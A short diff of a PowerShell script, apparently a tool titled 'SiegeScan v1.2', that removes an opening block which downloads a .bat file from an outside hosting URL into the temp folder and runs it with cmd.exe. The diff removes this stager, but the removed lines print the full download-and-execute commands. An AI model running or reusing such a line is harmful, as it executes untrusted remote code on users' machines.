@@ -1,11 +1,3 @@
-$batUrl = "https://mediumvioletred-mosquito-767246.hostingersite.com/test.bat"
-$batPath = "$env:TEMP\test.bat"
-
-Invoke-WebRequest -Uri $batUrl -OutFile $batPath
-
-# Block until the bat fully exits before continuing
-Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`"" -Wait
-
 Clear-Host
 $encodedTitle = "U2llZ2VTY2FuIHYxLjI="
 $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
